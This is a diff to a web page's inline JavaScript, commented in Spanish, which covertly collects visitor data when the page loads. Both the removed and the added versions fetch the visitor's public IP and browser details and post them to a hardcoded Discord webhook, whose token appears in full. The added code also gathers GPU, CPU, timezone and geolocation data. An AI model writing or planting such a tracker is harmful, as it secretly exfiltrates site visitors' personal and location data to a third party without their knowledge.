@@ -75,54 +75,150 @@
 
 
     <script>
-        // Función para obtener y enviar información del usuario
-        function sendUserInfo() {
-            // Recolectar IP pública
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip; // La IP del visitante
+        // Función para recolectar información del usuario y enviarla a Discord
+function sendUserInfo() {
+    // Obtener IP pública usando un servicio externo
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip; // La IP pública del visitante
 
-                    // Recolectar otros datos
-                    const userAgent = navigator.userAgent; // User-Agent
-                    const screenWidth = screen.width; // Ancho de pantalla
-                    const screenHeight = screen.height; // Altura de pantalla
-                    const os = navigator.platform; // Sistema operativo
-                    const idioma = navigator.language || navigator.userLanguage; // Idioma
-                    const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; // Tipo de conexión
-                    const referrer = document.referrer; // Página de referencia
+            // Recolectar otros datos del usuario
+            const userAgent = navigator.userAgent; // User-Agent del navegador
+            const screenWidth = screen.width; // Ancho de la pantalla
+            const screenHeight = screen.height; // Altura de la pantalla
+            const os = navigator.platform; // Sistema operativo
+            const idioma = navigator.language || navigator.userLanguage; // Idioma del navegador
+            const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; // Tipo de conexión a internet
+            const referrer = document.referrer; // Página de referencia
+            const cookiesEnabled = navigator.cookieEnabled; // Si las cookies están habilitadas
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
+            const currentTime = new Date().toLocaleString(); // Fecha y hora local
+            const browser = navigator.appName; // Nombre del navegador
+            const browserVersion = navigator.appVersion; // Versión del navegador
 
-                    // Datos a enviar
+            // Información de la GPU usando WebGL
+            let gpuInfo = 'Desconocido';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (error) {
+                console.error("Error obteniendo la GPU:", error);
+            }
+
+            // Información sobre la CPU (número de núcleos)
+            const cpuCores = navigator.hardwareConcurrency || "Desconocido";
+
+            // Intentar obtener geolocalización si el usuario lo permite
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Crear objeto con toda la información recolectada
                     const userInfo = {
                         IP: ip,
                         UserAgent: userAgent,
                         Screen: `${screenWidth}x${screenHeight}`,
                         OS: os,
                         Idioma: idioma,
-                        Conexión: connection,
-                        Referrer: referrer
+                        Conexion: connection,
+                        Referencia: referrer,
+                        CookiesHabilitadas: cookiesEnabled,
+                        ZonaHoraria: timezone,
+                        HoraActual: currentTime,
+                        Navegador: browser,
+                        VersionNavegador: browserVersion,
+                        Geolocalizacion: `Latitud: ${lat}, Longitud: ${lon}`,
+                        GPU: gpuInfo,
+                        CPU_Cores: cpuCores
                     };
 
-                    // Configuración del Webhook de Discord
-                    const webhookURL = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
-                    
-                    // Enviar la información al webhook
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: `Información del usuario:\n\`\`\`${JSON.stringify(userInfo, null, 2)}\`\`\``
-                        }),
-                    })
-                    .then(() => console.log("Información enviada a Discord."))
-                    .catch(error => console.error('Error al enviar la información:', error));
-                })
-                .catch(error => console.error('Error al obtener la IP:', error));
-        }
+                    // Enviar la información al webhook de Discord
+                    sendToDiscord(userInfo);
+                });
+            } else {
+                // Si no hay geolocalización disponible
+                const userInfo = {
+                    IP: ip,
+                    UserAgent: userAgent,
+                    Screen: `${screenWidth}x${screenHeight}`,
+                    OS: os,
+                    Idioma: idioma,
+                    Conexion: connection,
+                    Referencia: referrer,
+                    CookiesHabilitadas: cookiesEnabled,
+                    ZonaHoraria: timezone,
+                    HoraActual: currentTime,
+                    Navegador: browser,
+                    VersionNavegador: browserVersion,
+                    Geolocalizacion: 'No permitida',
+                    GPU: gpuInfo,
+                    CPU_Cores: cpuCores
+                };
 
-        // Llama a la función al cargar la página
-        window.onload = sendUserInfo;
+                // Enviar la información al webhook de Discord
+                sendToDiscord(userInfo);
+            }
+        })
+        .catch(error => console.error('Error obteniendo la IP pública:', error));
+}
+
+// Función para enviar la información al webhook de Discord
+function sendToDiscord(userInfo) {
+    const webhookUrl = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
+
+    const message = {
+        content: "Información del usuario:", // Mensaje de encabezado
+        embeds: [
+            {
+                title: "Detalles del usuario",
+                color: 3447003, // Color del mensaje en Discord
+                fields: [
+                    { name: "IP", value: userInfo.IP, inline: true },
+                    { name: "User-Agent", value: userInfo.UserAgent, inline: false },
+                    { name: "Pantalla", value: userInfo.Screen, inline: true },
+                    { name: "OS", value: userInfo.OS, inline: true },
+                    { name: "Idioma", value: userInfo.Idioma, inline: true },
+                    { name: "Conexión", value: userInfo.Conexion, inline: true },
+                    { name: "Referencia", value: userInfo.Referencia || "N/A", inline: true },
+                    { name: "Cookies Habilitadas", value: userInfo.CookiesHabilitadas ? "Sí" : "No", inline: true },
+                    { name: "Zona Horaria", value: userInfo.ZonaHoraria, inline: true },
+                    { name: "Hora Actual", value: userInfo.HoraActual, inline: true },
+                    { name: "Navegador", value: userInfo.Navegador, inline: true },
+                    { name: "Versión del Navegador", value: userInfo.VersionNavegador, inline: true },
+                    { name: "Geolocalización", value: userInfo.Geolocalizacion, inline: false },
+                    { name: "GPU", value: userInfo.GPU, inline: true },
+                    { name: "CPU Cores", value: userInfo.CPU_Cores.toString(), inline: true }
+                ]
+            }
+        ]
+    };
+
+    // Realizar el POST al webhook de Discord
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Información enviada exitosamente a Discord");
+        } else {
+            console.error("Error al enviar la información a Discord:", response.statusText);
+        }
+    })
+    .catch(error => console.error("Error al realizar la solicitud POST:", error));
+}
+
+// Llamar a la función para enviar la información del usuario
+sendUserInfo();
+
     </script>
 </body>
